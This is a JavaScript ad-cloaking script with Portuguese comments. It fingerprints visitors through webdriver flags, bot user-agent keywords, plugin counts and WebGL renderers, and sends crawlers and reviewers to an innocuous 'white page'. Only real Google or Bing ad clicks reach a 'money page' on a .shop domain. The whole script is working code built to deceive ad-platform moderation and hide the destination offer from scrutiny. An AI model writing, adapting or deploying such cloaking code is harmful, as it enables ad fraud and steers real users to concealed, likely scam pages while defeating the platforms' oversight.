<script id="auto-destruct-script">
(function() {
    // --- CONFIGURAÇÃO ---
    // Coloque aqui os links para a sua página de oferta (money page) e para a página segura (white page).
    const config = {
        // Link da sua oferta, para onde o tráfego legítimo de anúncios será enviado.
        moneyPageUrl: 'https://dasnsimei-fazenda.shop/?gcl=CM7PUmvg',

        // Link da página segura, para onde bots e tráfego não identificado serão enviados.
        whitePageUrl: 'https://www.criamigos.com.br/'
    };

    /**
     * Verifica se o visitante é um provável bot.
     * Esta é uma verificação básica e não é 100% garantida, mas bloqueia os bots mais simples.
     * @returns {boolean} - True se for um bot, false caso contrário.
     */
    function isBot() {
        try {
            // Padrão de User-Agent com palavras-chave comuns de bots e ferramentas de automação.
            const botKeywords = /bot|crawler|spider|crawling|headless|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|ia_archiver|puppeteer|playwright|selenium/i;
            const userAgent = navigator.userAgent || '';

            // 1. Verifica a flag 'webdriver', comum em navegadores automatizados.
            if (navigator.webdriver) {
                return true;
            }

            // 2. Verifica o User-Agent contra a lista de palavras-chave de bots.
            if (botKeywords.test(userAgent)) {
                return true;
            }

            // 3. Verifica por propriedades de navegadores headless antigos como o PhantomJS.
            if (window._phantom || window.callPhantom) {
                return true;
            }

            // 4. Verifica se o navegador tem uma contagem de plugins suspeitamente baixa (0).
            // Navegadores reais, mesmo em modo anônimo, costumam ter alguns plugins internos.
            if (navigator.plugins.length === 0) {
                return true;
            }

            // 5. Verifica se as dimensões da tela são irrealistas (muito pequenas ou 0).
            if (window.screen.width === 0 || window.screen.height === 0) {
                return true;
            }

            // 6. Verificação avançada de WebGL Renderer.
            // Bots em servidores frequentemente usam renderizadores de software (como SwiftShader, Mesa, llvmpipe)
            // em vez de uma GPU de hardware real.
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    if (renderer && /swiftshader|mesa|llvmpipe/i.test(renderer)) {
                        return true;
                    }
                }
            }
        } catch (e) {
            // Em caso de erro na detecção, assume que não é um bot para não bloquear usuários legítimos.
            return false;
        }
        return false;
    }

    /**
     * Executa a lógica principal de redirecionamento.
     */
    function executeRedirect() {
        // Primeiro, verifica se é um bot. Se for, envia para a white page.
        if (isBot()) {
            window.location.href = config.whitePageUrl;
            return;
        }

        const urlParams = new URLSearchParams(window.location.search);
        const gclid = urlParams.get('gclid'); // Google Click ID
        const msclkid = urlParams.get('msclkid'); // Microsoft Click ID
        const referer = document.referrer || '';

        // Lógica de verificação mais restrita:
        // Exige tanto o parâmetro de clique (gclid/msclkid) QUANTO a origem correta (referer).
        // Isso impede que alguém copie a URL com gclid e a acesse diretamente.
        const isFromGoogleAds = gclid && /google\.com/i.test(referer);
        const isFromBingAds = msclkid && /bing\.com/i.test(referer);

        if (isFromGoogleAds || isFromBingAds) {
            // Tráfego legítimo de anúncio: redireciona para a money page.
            // Preserva todos os parâmetros da URL original (gclid, utm_*, etc).
            const destinationUrl = new URL(config.moneyPageUrl);
            urlParams.forEach((value, key) => {
                destinationUrl.searchParams.append(key, value);
            });
            window.location.href = destinationUrl.toString();
        } else {
            // Tráfego suspeito (URL copiada), direto, orgânico ou de outra fonte: redireciona para a white page.
            window.location.href = config.whitePageUrl;
        }
    }

    // --- PONTO DE ENTRADA ---
    // Envolve a execução em um try-catch para evitar que erros quebrem a página.
    try {
        // Garante que o script está rodando em um ambiente de navegador.
        if (typeof window !== 'undefined' && typeof document !== 'undefined') {
            executeRedirect();
        }
    } catch (e) {
        // Em caso de qualquer erro inesperado, redireciona para a white page como medida de segurança.
        console.error("Erro no script de redirecionamento:", e);
        if (typeof window !== 'undefined') {
            window.location.href = config.whitePageUrl;
        }
    }
})();
</script>
